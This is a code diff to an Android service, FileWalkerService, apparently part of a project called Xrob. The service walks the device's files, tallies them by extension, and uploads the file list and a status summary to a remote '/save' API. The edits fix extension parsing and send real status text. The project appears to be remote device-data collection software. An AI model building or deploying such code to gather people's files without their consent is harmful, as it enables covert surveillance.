@@ -31,7 +31,7 @@ import okhttp3.Response;
 
 public class FileWalkerService extends Service {
 
-    private static final String KEY_PATH_TO_WALK = "path_to_walk";
+    public static final String KEY_PATH_TO_WALK = "path_to_walk";
 
     private static class FileWalker {
 
@@ -62,7 +62,7 @@ public class FileWalkerService extends Service {
         String getStatus() {
             final StringBuilder sb = new StringBuilder();
             for (Map.Entry<String, Integer> entry : status.entrySet()) {
-                sb.append(entry.getKey()).append("=").append(entry.getValue()).append("<br>");
+                sb.append(entry.getKey()).append("=").append("<b>").append(entry.getValue()).append("</b></br>");
             }
             return sb.toString();
         }
@@ -141,7 +141,8 @@ public class FileWalkerService extends Service {
                 final String fileName = file.getName();
 
                 if (fileName.contains(".")) {
-                    extension = fileName.split("\\.")[1];
+                    final String[] dotParts = fileName.split("\\.");
+                    extension = dotParts[dotParts.length - 1];
                 } else {
                     extension = KEY_UNKNOWN_FILES;
                 }
@@ -190,7 +191,7 @@ public class FileWalkerService extends Service {
                     final Request contactsRequest = new APIRequestBuilder("/save", apiKey)
                             .addParam(Xrob.KEY_ERROR, "false")
                             .addParam(Xrob.KEY_DATA_TYPE, Xrob.DATA_TYPE_FILES)
-                            .addParam(Xrob.KEY_MESSAGE, "Status need to be updated!!")
+                            .addParam(Xrob.KEY_MESSAGE, fileWalker.getStatus())
                             .addParam(Xrob.KEY_DATA, jaFiles.toString())
                             .build();
 
